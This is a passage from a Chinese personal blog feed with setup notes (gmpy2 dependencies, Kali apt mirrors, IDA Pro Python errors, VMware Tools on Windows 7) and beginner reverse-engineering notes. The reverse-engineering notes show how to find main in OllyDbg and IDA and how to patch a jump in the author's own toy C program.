<p>原因是缺少了一些系统依赖，分别是： <code>gmp</code>   <code>mpfr</code>   <code>mpc</code> <br />
 安装以下依赖就可以完成安装 <code>gmpy2</code> ：</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>apt<span class="token operator">-</span><span class="token keyword">get</span> install libgmp<span class="token operator">-</span>dev</pre></td></tr><tr><td data-num="2"></td><td><pre>apt<span class="token operator">-</span><span class="token keyword">get</span> install libmpfr<span class="token operator">-</span>dev</pre></td></tr><tr><td data-num="3"></td><td><pre>apt<span class="token operator">-</span><span class="token keyword">get</span> install libmpc<span class="token operator">-</span>dev</pre></td></tr></table></figure><h2 id="2缺失python的头文件和静态库包问题"><a class="anchor" href="#2缺失python的头文件和静态库包问题">#</a> 2. 缺失 python 的头文件和静态库包问题</h2>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211205132023479.png" alt="image-20211205132023479" /></p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>sudo apt<span class="token operator">-</span><span class="token keyword">get</span> install python3<span class="token operator">-</span>dev</pre></td></tr></table></figure><h2 id="3下载中断问题"><a class="anchor" href="#3下载中断问题">#</a> 3. 下载中断问题</h2>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211205132422798.png" alt="image-20211205132422798" /></p>
<p>尝试换源后，重新下载。</p>
<p>PS: 换源要注意备份！</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>vim <span class="token operator">/</span>etc<span class="token operator">/</span>apt<span class="token operator">/</span>sources<span class="token punctuation">.</span>list</pre></td></tr></table></figure><figure class="highlight java"><figcaption data-lang="java"></figcaption><table><tr><td data-num="1"></td><td><pre>#阿里云</pre></td></tr><tr><td data-num="2"></td><td><pre>deb http<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span>mirrors<span class="token punctuation">.</span>aliyun<span class="token punctuation">.</span>com<span class="token operator">/</span>kali kali<span class="token operator">-</span>rolling main non<span class="token operator">-</span>free contrib</pre></td></tr><tr><td data-num="3"></td><td><pre>deb<span class="token operator">-</span>src http<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span>mirrors<span class="token punctuation">.</span>aliyun<span class="token punctuation">.</span>com<span class="token operator">/</span>kali kali<span class="token operator">-</span>rolling main non<span class="token operator">-</span>free contrib</pre></td></tr><tr><td data-num="4"></td><td><pre>deb http<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span>mirrors<span class="token punctuation">.</span>aliyun<span class="token punctuation">.</span>com<span class="token operator">/</span>kali<span class="token operator">-</span>security kali<span class="token operator">-</span>rolling<span class="token operator">/</span>updates main contrib non<span class="token operator">-</span>free</pre></td></tr><tr><td data-num="5"></td><td><pre>#中科大</pre></td></tr><tr><td data-num="6"></td><td><pre>deb http<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span>mirrors<span class="token punctuation">.</span>ustc<span class="token punctuation">.</span>edu<span class="token punctuation">.</span>cn<span class="token operator">/</span>kali kali<span class="token operator">-</span>rolling main non<span class="token operator">-</span>free contrib</pre></td></tr><tr><td data-num="7"></td><td><pre>deb<span class="token operator">-</span>src http<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span>mirrors<span class="token punctuation">.</span>ustc<span class="token punctuation">.</span>edu<span class="token punctuation">.</span>cn<span class="token operator">/</span>kali kali<span class="token operator">-</span>rolling main non<span class="token operator">-</span>free contrib</pre></td></tr></table></figure><h1 id="idapro启动时报错python-runtime"><a class="anchor" href="#idapro启动时报错python-runtime">#</a> IDApro 启动时报错：python runtime</h1>
<ol>
<li>报错：</li>
</ol>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220324122415631.png" alt="image-20220324122415631" /></p>
<p>2，解决方法：</p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token number">1</span>）运行和ida同文件夹下的idapyswitch<span class="token punctuation">.</span>exe</pre></td></tr><tr><td data-num="2"></td><td><pre>    找到这一行</pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220324122514758.png" alt="image-20220324122514758" /></p>
<p>每台电脑路径可能不一样</p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token number">2</span>）接着打开环境变量</pre></td></tr><tr><td data-num="2"></td><td><pre>    创建新的用户变量PYTHONHOME，路径为<span class="token string">"C:\ProgramData\Miniconda3"</span><span class="token punctuation">(</span>上图标注的那个路径<span class="token punctuation">)</span></pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220324122544370.png" alt="image-20220324122544370" /></p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre>在Path里创建新路径<span class="token string">"C:\ProgramData\Miniconda3\Lib"</span><span class="token punctuation">(</span>上面的路径<span class="token operator">+</span>Lib<span class="token punctuation">)</span></pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220324122658210.png" alt="image-20220324122658210" /></p>
<p>保存并再次运行 ida，一切正常</p>
<h1 id="vm16-虚拟机win7无法安装vm-tools解决方法"><a class="anchor" href="#vm16-虚拟机win7无法安装vm-tools解决方法">#</a> VM16 虚拟机 Win7 无法安装 VM tools 解决方法</h1>
<p><code>VMware Workstation 16</code>  虚拟机  <code>Windows 7</code>  可能无法安装  <code>VMware tools</code>  的两个症状：一是「安装  <code>Vmware Toos(T)</code> ...」菜单灰色；二是安装过程中会提示「安装程序无法自动安装  <code>Virtual Machine Communication Interface Sockets(VSock)</code>  驱动程序。必须手动安装此驱动程序」等错误而安装失败。</p>
<h2 id="vm-workstation-16-虚拟机安装-vmware-toost菜单灰色-解决办法"><a class="anchor" href="#vm-workstation-16-虚拟机安装-vmware-toost菜单灰色-解决办法">#</a> VM Workstation 16 虚拟机「安装 Vmware Toos (T)...」菜单灰色 解决办法</h2>
<h3 id="11手动加载-vmware-toos-光盘"><a class="anchor" href="#11手动加载-vmware-toos-光盘">#</a> 1.1 手动加载 Vmware Toos 光盘</h3>
<p>启动虚拟系统后，在  <code>VMware Workstation</code>  菜单栏「虚拟机」-「设置」「-CD-ROM」-「使用 ISO 镜像」-「浏览」，定位到物理机  <code>VMware Workstation</code>  安装目录中  <code>windows.iso</code>  文件，然后进入虚拟  <code>Win7</code>  系统，打开「我的电脑」-「光驱」- 找到「 <code>setup.exe</code> 」文件执行安装即可。</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211205185613146.png" alt="image-20211205185613146" /></p>
<h3 id="12修改软盘为自动检测"><a class="anchor" href="#12修改软盘为自动检测">#</a> 1.2 修改软盘为自动检测</h3>
<p>在开启虚拟机操作系统情况下，虚拟机设置中更改  <code>Floppy</code> （软盘）为  <code>Auto detect</code> （自动检测），保存可能会提示出错，不用理会。如无意外，「安装  <code>Vmware Toos(T)</code> ...」已经可以点击，加载成功，虚拟操作系统中光驱里就会有  <code>VMWare Tools</code>  安装程序，打开安装即可。</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211205190123458.png" alt="image-20211205190123458" /></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211205185737907.png" alt="image-20211205185737907" /></p>
<p>重新进入虚拟机即可发现安装 <code>VM tools</code>  按钮可用了。</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211205190428357.png" alt="image-20211205190428357" /></p>
<h2 id="vm-workstation-16-虚拟机-win-7-安装-vmware-tools-失败"><a class="anchor" href="#vm-workstation-16-虚拟机-win-7-安装-vmware-tools-失败">#</a> VM Workstation 16 虚拟机 Win 7 安装 VMware tools 失败</h2>
<p>如无意外，安装  <code>VMware Tools</code>  过程中，会弹出「 <code>Windows</code>  无法验证此驱动程序软件的发布者」，点击「始终安装」继续强制安装，最终会弹出「安装程序无法自动安装  <code>Virtual Machine Communication Interface Sockets(VSock)</code>  驱动程序。必须手动安装此驱动程序」等错误提示，最终导致安装失败。</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211205190248651.png" alt="image-20211205190248651" /></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211205190316611.png" alt="image-20211205190316611" /></p>
<p>解决方法：由于微软更新了驱动程序签名算法，2019 年开始弃用  <code>SHA1</code> ，改用 <code>SHA2</code> 。</p>
<p><code> VMware Tools</code>  驱动程序使用  <code>SHA2</code> ，而  <code>Windows7</code>  只支持 <code>SHA1</code> ，需要下载安装补丁  <code>KB4474419</code>  来支持  <code>SHA2</code>  算法。</p>
<p><span class="exturl" data-url="aHR0cHM6Ly93d3cuY2F0YWxvZy51cGRhdGUubWljcm9zb2Z0LmNvbS9TZWFyY2guYXNweD9xPWtiNDQ3NDQxOQ==">下载地址</span></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211205193001934.png" alt="image-20211205193001934" /><br />
 安装 <code>KB4474419</code>  补丁完成，再安装  <code>VMware tools</code>  就可以顺利安装上。</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211210121019804.png" alt="image-20211210121019804" /></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211210121032770.png" alt="image-20211210121032770" /></p>
<p><span class="exturl" data-url="aHR0cHM6Ly9jeWhvdXIuY29tLzE2NDUv">参考链接</span></p>
]]></content>
      <categories>
        <category>SNote</category>
      </categories>
      <tags>
        <tag>SNote</tag>
      </tags>
  </entry>
  <entry>
    <title>逆向工程Studying Notes Days 2</title>
    <url>/article/547ee673.html</url>
    <content><![CDATA[<p>听说有人噶腰子不打麻药，awa！！！</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220304162816819.png" alt="image-20220304162816819" /></p>
<h1 id="修改跳转"><a class="anchor" href="#修改跳转">#</a> 修改跳转</h1>
<h2 id="测试程序代码"><a class="anchor" href="#测试程序代码">#</a> 测试程序代码：</h2>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span></pre></td></tr><tr><td data-num="3"></td><td><pre></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="6"></td><td><pre>	<span class="token keyword">int</span> nNum <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="7"></td><td><pre>	<span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>nNum<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="8"></td><td><pre>	<span class="token keyword">if</span> <span class="token punctuation">(</span>nNum <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="9"></td><td><pre>	<span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="10"></td><td><pre>		<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"True!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="11"></td><td><pre>	<span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="12"></td><td><pre>	<span class="token keyword">else</span></pre></td></tr><tr><td data-num="13"></td><td><pre>	<span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="14"></td><td><pre>		<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"False!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="15"></td><td><pre>	<span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="16"></td><td><pre>	<span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"pause"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="17"></td><td><pre>	<span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="18"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p>通过测试程序源代码可以知道：</p>
<ul>
<li>当输入的 <code>变量nNum</code>  为 &quot; <code>0</code> &quot;时，输出结果为&quot; <code>True!</code> &quot;</li>
<li>当输入的 <code>变量nNum</code>  不为 &quot; <code>0</code> &quot;时，输出结果为&quot; <code>False!</code> &quot;</li>
</ul>
<p>代码生成属性</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220304154315418.png" alt="image-20220304154315418" /></p>
<h2 id="运行测试"><a class="anchor" href="#运行测试">#</a> 运行测试：</h2>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220304151201142.png" alt="image-20220304151201142" /></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220304151216096.png" alt="image-20220304151216096" /></p>
<h2 id="修改测试"><a class="anchor" href="#修改测试">#</a> 修改测试</h2>
<p>接下来我们通过修改跳转使该程序在无论输入什么的情况下，它的输出结果始终为 &quot; <code>True!</code> &quot;。</p>
<p>将生成好的 <code>x86Debug版</code> 的 <code>.exe</code>  文件用 <code>ollydbg</code>  打开后，找到 <code>main函数</code></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220305124047363.png" alt="image-20220305124047363" /></p>
<h3 id="修改跳转的地址"><a class="anchor" href="#修改跳转的地址">#</a> 修改跳转的地址</h3>
<p>将 <code>JNZ SHORT 0020436F</code>  修改为 <code>jmp SHORT 00204360</code></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220305124222874.png" alt="image-20220305124222874" /></p>
<h4 id="进行测试"><a class="anchor" href="#进行测试">#</a> 进行测试</h4>
<p>此时无论输入什么，输出均为 &quot; <code>True!</code> &quot;</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220305124435759.png" alt="image-20220305124435759" /></p>
<h3 id="修改对比值"><a class="anchor" href="#修改对比值">#</a> 修改对比值</h3>
<p>将 <code>CMP DWORD PTR SS:[EBP-C],0</code>  中的对比值进行修改</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220305124724098.png" alt="image-20220305124724098" /></p>
<p>修改为 <code>5</code>  后，进行测试</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220305124823224.png" alt="image-20220305124823224" /></p>
<p>此时当你输入 <code>5</code>  时，输出 &quot; <code>True!</code> &quot;。</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220305125007723.png" alt="image-20220305125007723" /></p>
<h2 id="报错"><a class="anchor" href="#报错">#</a> 报错</h2>
<h3 id="报错描述"><a class="anchor" href="#报错描述">#</a> 报错描述</h3>
<figure class="highlight shell"><figcaption data-lang="Bash"></figcaption><table><tr><td data-num="1"></td><td><pre>error C4996: <span class="token string">'scanf'</span><span class="token builtin class-name">:</span> This <span class="token keyword">function</span> or variable may be unsafe. Consider using scanf_s instead. To disable deprecation, use _CRT_SECURE_NO_WARNINGS. See online <span class="token builtin class-name">help</span> <span class="token keyword">for</span> details.</pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220304142908284.png" alt="image-20220304142908284" /></p>
<p>这项报错也就是所谓的安全检查错误。</p>
<h3 id="报错原因"><a class="anchor" href="#报错原因">#</a> 报错原因</h3>
<p>在 Visual Studio 系列编译器中，认为 <code>scanf函数</code> 是不安全的，即使你引入了头文件，但是编译器还是认为它是不安全的。</p>
<h3 id="解决方法"><a class="anchor" href="#解决方法">#</a> 解决方法</h3>
<h4 id="方法一"><a class="anchor" href="#方法一">#</a> 方法一</h4>
<p>在 <code>.c</code>  或 <code>.cpp</code>  文件中的头部加入 <code>#pragma warning(disable:4996)</code></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220304143327474.png" alt="image-20220304143327474" /></p>
<h4 id="方法二"><a class="anchor" href="#方法二">#</a> 方法二</h4>
<p>在 <code>.c</code>  或 <code>.cpp</code>  文件中的头部加入 <code>#define _CRT_SECURE_NO_WARNINGS 10</code></p>
<p><code>10</code>  可以不加也可以替换为别的整数</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220304143707138.png" alt="image-20220304143707138" /></p>
<h4 id="方法三"><a class="anchor" href="#方法三">#</a> 方法三</h4>
<p>按照编译器的要求使用 <code>scanf_s</code>  代替 <code>scanf</code></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220304144204845.png" alt="image-20220304144204845" /></p>
<h4 id="方法四"><a class="anchor" href="#方法四">#</a> 方法四</h4>
<p>如果不习惯用 <code>scanf_s函数</code> ，采用最多的当然是前两种方法了，但是如果在每个 <code>.c</code>  或 <code>.cpp</code>  文件里都要写上面两个方法中的其中一句时，也是一件挺麻烦的事情，所以如何把这句话在创建每一个新的 <code>.c</code>  或 <code>.cpp</code>  文件时自动写入新创建的文件当中呢？</p>
<ol>
<li>找到 Visual Stuaio 编译器的安装位置</li>
</ol>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220304144717755.png" alt="image-20220304144717755" /></p>
<ol start="2">
<li>找到 VC 文件夹，点击进入</li>
</ol>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220304144800899.png" alt="image-20220304144800899" /></p>
<ol start="3">
<li>找到 <code>vcprojectitems</code>  文件夹，点击进入</li>
</ol>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220304144846787.png" alt="image-20220304144846787" /></p>
<ol start="4">
<li>打开 <code>newc++file.cpp</code>  文件，写入 <code>#pragma warning(disable:4996)</code>  或者 <code>#define _CRT_SECURE_NO_WARNINGS 10</code></li>
</ol>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220304144954850.png" alt="image-20220304144954850" /></p>
<p>保存提示权限不足</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220304145238496.png" alt="image-20220304145238496" /></p>
<p>右键打开属性添加权限</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220304145315437.png" alt="image-20220304145315437" /></p>
<p>即可成功保存</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220304150054148.png" alt="image-20220304150054148" /></p>
<h4 id="方法五"><a class="anchor" href="#方法五">#</a> 方法五</h4>
<p>右键项目打开属性 (Project properties)</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220304150206651.png" alt="image-20220304150206651" /></p>
<p>在配置属性 (Configuration Properties) 中找到 C/C<ins> 预处理器 (C/C</ins>-&gt;Preprocessor)</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220304150229840.png" alt="image-20220304150229840" /></p>
<p>在预处理器定义 (Preprocessor Definitions) 中添加 <code>_CRT_SECURE_NO_WARNINGS</code>  即可</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220304150258216.png" alt="image-20220304150258216" /></p>
<p>好了，这样一切就大功告成了</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220304150504534.png" alt="image-20220304150504534" /></p>
<h1 id="滑板指令"><a class="anchor" href="#滑板指令">#</a> 滑板指令</h1>
<p>所谓滑板指令就是直接从这个指令上过去而不产生任何作用效果</p>
<p>在 <code>x86</code>  的汇编中滑板指令为 &quot; <code>nop 90</code> &quot;</p>
<p>让 <code>主函数main</code>  中的 <code>jnz</code>  指令不执行</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220305125343989.png" alt="image-20220305125343989" /></p>
<p>将 <code>jnz</code>  指令替换成 <code>nop</code>  进行汇编</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220305125416593.png" alt="image-20220305125416593" /></p>
<p>此时无论输入什么都会通过下一行的 <code>push</code>  然后通过 <code>jmp</code>  的无条件跳转到 <code>printf</code>  进行输出，而下面的 <code>push false</code>  则永远不会执行。</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220305125521788.png" alt="image-20220305125521788" /></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220305125533888.png" alt="image-20220305125533888" /></p>
]]></content>
      <categories>
        <category>逆向工程</category>
      </categories>
      <tags>
        <tag>逆向工程</tag>
      </tags>
  </entry>
  <entry>
    <title>逆向工程Studying Notes Days 1</title>
    <url>/article/c56b0a10.html</url>
    <content><![CDATA[<p>你们的野心什么的我都不在乎！！！但至今为止因为你，这个国家的人连饭都吃不上，对吧？这是我最后的 &quot;四档&quot;！！！直到力竭为止，我都不会停止攻击的！！！唯独你，我绝对要把你！！！轰出 [和之国]！！！</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220302192241818.png" alt="image-20220302192241818" /></p>
<h1 id="寻找main函数"><a class="anchor" href="#寻找main函数">#</a> 寻找 main 函数</h1>
<p>对 <code>Debug</code>  和 <code>Release</code>  进行初步了解</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220302201739099.png" alt="image-20220302201739099" /></p>
<ul>
<li>
<p><code>Debug</code> ：带调试信息，不会进行太多的优化</p>
</li>
<li>
<p><code>Release</code> ：对程序进行优化，精简代码，合并或取消重复的、无意义的函数，使生成的程序更小，运行速度更快</p>
</li>
</ul>
<p>在分析程序时一般为 <code>Release</code>  版本的程序但同时也不排除有 <code>Debug</code>  版本的程序，在程序分析过程中我们要先找到我们所需要的代码也即 <code>主函数main</code>  中的代码。</p>
<p>准备两个版本的运行程序：</p>
<ul>
<li><code>D.exe</code> ： <code>Debug</code>  版本的运行程序</li>
<li><code>R.exe</code> ： <code>Release</code>  版本的运行程序</li>
</ul>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220302202456907.png" alt="image-20220302202456907" /></p>
<h2 id="ollydbg打开"><a class="anchor" href="#ollydbg打开">#</a> Ollydbg 打开</h2>
<p>通过 <code>Ollydbg</code>  打开 <code>D.exe</code>  程序来寻找它的 <code>主函数main</code></p>
<h3 id="第一种方式"><a class="anchor" href="#第一种方式">#</a> 第一种方式</h3>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220302202649929.png" alt="image-20220302202649929" /></p>
<p>在 <code>Ollydbg</code>  中右键 &quot;查找&quot;-&gt;&quot;所有参考文本字符串&quot;</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220302203027111.png" alt="image-20220302203027111" /></p>
<p>可以看到我们想要的字符串</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220302204100728.png" alt="image-20220302204100728" /></p>
<p>双击即可进入 <code>main函数</code></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220302203834324.png" alt="image-20220302203834324" /></p>
<h3 id="第二种方式"><a class="anchor" href="#第二种方式">#</a> 第二种方式</h3>
<p>打开后在第一行的 <code>call</code>  位置按 &quot; <code>F8</code> &quot; 进行跳转</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220302204249698.png" alt="image-20220302204249698" /></p>
<p>再次按 &quot; <code>F8</code> &quot;，可以发现右侧注释部分出现红色</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220302204437728.png" alt="image-20220302204437728" /></p>
<p>多次点击 &quot; <code>F8</code> &quot; 到红色注释部分后</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220302204532482.png" alt="image-20220302204532482" /></p>
<p>按 &quot; <code>F7</code> &quot;进入后一路&quot; <code>F8</code> &quot;</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220302204602409.png" alt="image-20220302204602409" /></p>
<p>发现右侧注释部分再次出现红色注释</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220302204755507.png" alt="image-20220302204755507" /></p>
<p>再次点击 &quot; <code>F8</code> &quot;到该处，若能跳转到此处则按&quot; <code>F7</code> &quot;进入，如若不然则继续&quot; <code>F8</code> &quot; 直到能跳转</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220302204858949.png" alt="image-20220302204858949" /></p>
<p>按 &quot; <code>F7</code> &quot; 进入后</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220302205018035.png" alt="image-20220302205018035" /></p>
<p>继续一路 &quot; <code>F8</code> &quot;，可以发现三个&quot; <code>push</code> &quot;，一个&quot; <code>call</code> &quot;，我们知道完整的 <code>main函数</code> 是 <code>存在三个完整的参数</code> 的</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220302205208536.png" alt="image-20220302205208536" /></p>
<p>此时我们可以标记一下： <code>此处疑似main函数</code></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220302205504882.png" alt="image-20220302205504882" /></p>
<p>此时在此处按 &quot; <code>F7</code> &quot; 进入</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220302205539195.png" alt="image-20220302205539195" /></p>
<p>可以发现 &quot; <code>21r000</code> &quot; 字样，而旁边的红色注释则是条用的 <code>main函数</code></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220302205627082.png" alt="image-20220302205627082" /></p>
<p>同时 <code>Release</code>  版本还可以在打开的页面直接进行查找</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220302205941831.png" alt="image-20220302205941831" /></p>
<h2 id="ida打开"><a class="anchor" href="#ida打开">#</a> ida 打开</h2>
<p>打开 <code>ida</code>  后直接将文件拖入后</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220302210126653.png" alt="image-20220302210126653" /></p>
<p>自动找到 main 函数</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220302210159813.png" alt="image-20220302210159813" /></p>
<p>此外 <code>ida</code>  的 &quot; <code>F5</code> &quot; 也可带你进入 <code>main函数</code> 。</p>
<h1 id="修改内存中的数据"><a class="anchor" href="#修改内存中的数据">#</a> 修改内存中的数据</h1>
<p>测试程序代码：</p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span></pre></td></tr><tr><td data-num="3"></td><td><pre></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="6"></td><td><pre>	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Hello 21r000!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="7"></td><td><pre>	<span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"pause"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="8"></td><td><pre>	<span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="9"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p>运行程序后可以看到，输出结果为 &quot; <code>Hello 21r000!</code> &quot;</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220303155617428.png" alt="image-20220303155617428" /></p>
<p>接下来我们开始对该字符串进行修改，采用 <code>Release</code>  版本的运行程序进行测试</p>
<h2 id="直接修改"><a class="anchor" href="#直接修改">#</a> 直接修改</h2>
<p>将 <code>.exe文件</code> 在 <code>Ollydbg</code>  中打开</p>
